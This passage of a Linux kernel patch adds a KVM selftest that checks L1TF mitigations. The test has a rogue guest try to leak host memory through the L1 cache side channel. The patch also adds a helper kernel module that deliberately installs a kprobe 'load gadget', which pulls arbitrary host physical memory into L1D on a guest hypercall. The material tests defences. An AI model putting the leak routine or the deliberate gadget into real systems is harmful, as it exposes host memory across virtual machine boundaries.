+	vm_userspace_mem_region_add(vm, VM_MEM_SRC_ANONYMOUS, SHMEM_REGION_GPA,
+				    SHMEM_REGION_SLOT, nprobe_pages, 0);
+
+	probe_array = (uint64_t)addr_gpa2hva(vm, SHMEM_REGION_GPA);
+	/* Ensure that pages are present (resident in memory) on the host. */
+	for (i = 0; i < nprobe_pages; ++i)
+		WRITE_ONCE(*(uint64_t *)(probe_array + i * PAGE_SIZE), 0x42);
+
+	virt_map(vm, SHMEM_REGION_GVA, SHMEM_REGION_GPA, nprobe_pages);
+
+	for (i = 0; i < nprobe_pages; ++i) {
+		/* The probe pages need to be present. */
+		set_pte_bits(vm, vcpu, SHMEM_REGION_GVA + i * PAGE_SIZE,
+			     PTE_PRESENT_MASK);
+	}
+
+	/* The rogue PTE triggers a fault, so we exit gracefully. */
+	vm_install_exception_handler(vm, PF_VECTOR, guest_pf_handler);
+
+	/*
+	 * Save the initial register state so that RSP can be reinitialized at
+	 * every vcpu execution. Otherwise we run out of stack.
+	 */
+	vcpu_regs_get(vcpu, &regs_init);
+
+	secret = (uint8_t *)mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE,
+				 MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
+	TEST_ASSERT((void *)secret != MAP_FAILED, "Failed to allocate memory");
+
+	/*
+	 * Read from the second L1 cache set since the first might have more
+	 * activity. This makes the test more stable.
+	 */
+	secret_pa_offset = sysconf(_SC_LEVEL1_DCACHE_LINESIZE);
+	TEST_ASSERT(secret_pa_offset != -1,
+		    "sysconf(_SC_LEVEL1_DCACHE_LINESIZE) failed");
+
+	for (i = 0; i < secret_size; ++i) {
+		secret[i] = read_byte_vm(vm, vcpu, secret_pa >> PAGE_SHIFT,
+					 secret_pa_offset + i,
+					 (uint64_t)probe_array);
+	}
+
+	/*
+	 * Count the number of matching bytes. The test can be noisy therefore
+	 * some byte values might be wrong.
+	 */
+	leaked_value = *(uint64_t *)secret;
+	for (i = 0; i < secret_size; ++i) {
+		mask = 0xFFUL << (8 * i);
+		if ((leaked_value & mask) == (SECRET_VALUE & mask))
+			match++;
+	}
+
+	if (match > 1) {
+		cleanup(pid, vm);
+		TEST_FAIL(
+			"The leaked secret (0x%lx) (partially) matches expected secret (0x%lx)",
+			leaked_value, SECRET_VALUE);
+	}
+	pr_info("[PASS] The rogue guest cannot exploit L1TF against the host kernel to leak user memory. The leaked secret (0x%lx) doesn't match the child secret (0x%lx).\n",
+		leaked_value, SECRET_VALUE);
+
+	cleanup(pid, vm);
+
+	return 0;
+}
diff --git a/tools/testing/selftests/kvm/x86/l1tf_test.sh b/tools/testing/selftests/kvm/x86/l1tf_test.sh
new file mode 100755
index 0000000000000000000000000000000000000000..eb681fbb8df4f9e5a14e4f508acc3af5edd748bb
--- /dev/null
+++ b/tools/testing/selftests/kvm/x86/l1tf_test.sh
@@ -0,0 +1,10 @@
+#!/usr/bin/env bash
+# SPDX-License-Identifier: GPL-2.0
+
+insmod x86/test_modules/l1tf_test_helper.ko
+
+./l1tf_test
+status=$?
+rmmod l1tf_test_helper
+
+exit $status
diff --git a/tools/testing/selftests/kvm/x86/test_modules/Makefile b/tools/testing/selftests/kvm/x86/test_modules/Makefile
new file mode 100644
index 0000000000000000000000000000000000000000..0a3465511c598dd7e8f438bcb1c39b90bf1b3fc2
--- /dev/null
+++ b/tools/testing/selftests/kvm/x86/test_modules/Makefile
@@ -0,0 +1,10 @@
+TESTMODS_DIR := $(realpath $(dir $(abspath $(lastword $(MAKEFILE_LIST)))))
+KDIR ?= /lib/modules/$(shell uname -r)/build
+
+obj-m += l1tf_test_helper.o
+
+modules:
+	$(Q)$(MAKE) -C $(KDIR) modules KBUILD_EXTMOD=$(TESTMODS_DIR)
+
+clean:
+	$(Q)$(MAKE) -C $(KDIR) clean KBUILD_EXTMOD=$(TESTMODS_DIR)
diff --git a/tools/testing/selftests/kvm/x86/test_modules/l1tf_test_helper.c b/tools/testing/selftests/kvm/x86/test_modules/l1tf_test_helper.c
new file mode 100644
index 0000000000000000000000000000000000000000..4e31b0cdcfdf6dec8c55b4d2aa51477814bb571e
--- /dev/null
+++ b/tools/testing/selftests/kvm/x86/test_modules/l1tf_test_helper.c
@@ -0,0 +1,92 @@
+// SPDX-License-Identifier: GPL-2.0-only
+/*
+ * l1tf_test_helper.c: L1D load gadget. In order to reliably exploit L1TF in
+ * order to test mitigations, this deliberately introduces a gadget, i.e. a
+ * piece of code that can be induced by an attacker to bring the target data
+ * into L1D.
+ */
+
+#include <linux/kern_levels.h>
+#include <linux/kprobes.h>
+#include <linux/module.h>
+#include <linux/printk.h>
+#include <linux/kvm_host.h>
+#include <asm/kvm_vcpu_regs.h>
+
+#define KVM_HC_SELFTESTS_KVM_L1TF_TEST 0x42
+
+static noinline u64 load_gadget(u64 hpa, u64 offset, int nloops)
+{
+	u8 *kaddr;
+	u64 val;
+	int i;
+
+	offset = ALIGN_DOWN(offset, L1_CACHE_BYTES);
+
+	kaddr = (u8 *)pfn_to_kaddr((unsigned long)hpa >> PAGE_SHIFT);
+
+	/*
+	 * Loading should cache (L1D) the data at address hpa. Repeating the
+	 * access might delay the eviction of the cache line in case of cache
+	 * activity in the same set (depending on the replacement policy). This
+	 * is not guaranteed though, because the test execution conditions are
+	 * not constant.
+	 */
+	for (i = 0; i < nloops; i++)
+		val = READ_ONCE(*(u64 *)(kaddr + offset));
+
+	return val;
+}
+
+static void __kprobes hypercall_probe_handler(struct kprobe *p,
+					      struct pt_regs *regs,
+					      unsigned long flags)
+{
+	unsigned long nr, hpa, offset, nloops;
+	unsigned long ret;
+	struct kvm_vcpu *vcpu;
+
+	vcpu = (struct kvm_vcpu *)regs_get_kernel_argument(regs, 0);
+	nr = vcpu->arch.regs[VCPU_REGS_RAX];
+	hpa = vcpu->arch.regs[VCPU_REGS_RBX];
+	offset = vcpu->arch.regs[VCPU_REGS_RCX];
+	nloops = vcpu->arch.regs[VCPU_REGS_RDX];
+
+	/* The vmcall must be executed by the L1TF test, otherwise return. */
+	if (nr != KVM_HC_SELFTESTS_KVM_L1TF_TEST)
+		return;
+
+	ret = load_gadget(hpa, offset, nloops);
+	READ_ONCE(ret);
+}
+
+static const char attach_func_symbol[] = "kvm_emulate_hypercall";
+
+static struct kprobe hypercall_probe = {
+	.symbol_name = attach_func_symbol,
+};
+
+static int __init l1tf_test_kmod_init(void)
+{
+	int err;
+
+	hypercall_probe.post_handler = hypercall_probe_handler;
+	err = register_kprobe(&hypercall_probe);
+	if (err) {
+		pr_err("Failed to attach kprobe to %s\n", attach_func_symbol);
+		return err;
+	}
+
+	return 0;
+}
+
+static void l1tf_test_kmod_exit(void)
+{
+	unregister_kprobe(&hypercall_probe);
+}
+
+module_init(l1tf_test_kmod_init);
+module_exit(l1tf_test_kmod_exit);
+
+MODULE_DESCRIPTION("Helper for testing L1TF mitigations");
+MODULE_LICENSE("GPL");

-- 
2.50.1


